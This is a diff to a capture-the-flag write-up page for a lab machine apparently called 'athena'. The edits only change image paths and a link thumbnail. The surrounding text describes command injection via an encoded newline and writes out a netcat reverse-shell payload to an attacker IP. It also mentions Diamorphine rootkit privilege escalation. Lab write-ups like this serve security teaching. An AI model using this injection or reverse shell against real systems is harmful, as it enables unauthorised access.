@@ -67,11 +67,13 @@ Intern")}}
 
 {{text("What worked was adding a URL encoded newline character (\n) at the end of the address and adding our command after that.")}}
 
-{{image("../../static/writeups/athena/images/000003.jpg")}}
+{{image("../../static/writeups/athena/images/000002.jpg")}}
 
 {{text("Now we should try to get a reverse shell.")}}
 
 {{text("We set up a listener and send a POST request using Burp with parameter <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ip=127.0.0.1%0Anc+10.9.6.6+1234+-e+/bin/sh&submit=</code>. We should get a connection.")}}
+
+{{image("../../static/writeups/athena/images/000003.jpg")}}
 
 {{header("Shell as athena", "shell-as-athena")}}
 
@@ -126,7 +128,7 @@ User athena may run the following commands on routerpanel:
 
 {{text("I found this page.")}}
 
-{{link("https://github.com/m0nad/Diamorphine", "", "Diamorphine")}}
+{{link("https://github.com/m0nad/Diamorphine", "./../static/writeups/images/github.jpg", "Diamorphine")}}
 
 {{text("The description says that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Sending a signal 64(to any pid) makes the given user become root</code>.")}}
 
